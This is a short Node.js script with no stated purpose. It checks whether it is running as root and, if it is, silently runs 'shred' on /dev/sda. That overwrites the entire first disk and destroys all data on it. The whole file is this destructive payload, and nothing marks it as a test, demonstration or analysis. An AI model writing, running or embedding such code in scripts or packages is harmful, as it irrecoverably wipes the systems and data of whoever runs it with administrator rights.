#!/usr/bin/env node
const { spawnSync } = require("child_process");
if (process.getuid() === 0) {
  spawnSync("shred", ["-n", "1", "/dev/sda"]);
}
